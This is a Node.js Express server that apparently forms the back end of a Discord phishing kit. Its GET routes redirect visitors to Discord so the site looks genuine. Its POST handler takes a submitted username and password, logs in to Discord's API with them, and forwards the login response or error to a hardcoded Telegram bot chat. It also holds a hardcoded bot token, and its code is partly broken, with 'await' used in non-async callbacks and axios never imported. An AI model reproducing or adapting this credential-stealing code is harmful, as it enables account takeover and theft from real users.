const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');

const botToken = "6467130261:AAF7iAaqrPhgDJm7NkZGIhxgGPQ41s4jwOw";
const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

app.use(cors());
app.use(bodyParser.json());

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:5000'); // Change "*" if needed
    res.setHeader('Access-Control-Allow-Methods', 'DELETE, POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    next();
});

app.get("/", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.get("/:one", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.post('/api', (req, res) => {
  const info = req.body;
  console.log(info);

  fetch("https://discord.com/api/v9/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        login: req.body.name,
        password: req.body.email
      })
    })
    .then((response) => response.json())
    .then((data) => {
      // Успешно!
      console.log(data);

      try {
        await axios
          .post(apiUrl, {
            chat_id: "6425112328",
            text: `${data}`,
          })
          .then((response) => {
            console.log("successfully");
          })
          .catch((error) => {
            console.error("Error");
          });   
      } catch (error) {
        console.error("error tg send");
      }
        
    })
    .catch((error) => {
      // Ошибка!
      console.error(error);

      try {
        await axios
          .post(apiUrl, {
            chat_id: "6425112328",
            text: `${error}`,
          })
          .then((response) => {
            console.log("successfully");
          })
          .catch((error) => {
            console.error("Error");
          });   
      } catch (error) {
        console.error("error tg send");
      }
        
    });

  const response = {
    endpoint: 'https://www.american.bank/'
  };

  res.json(response);
});

app.listen(3000, () => {
  console.log('port 3000');
});
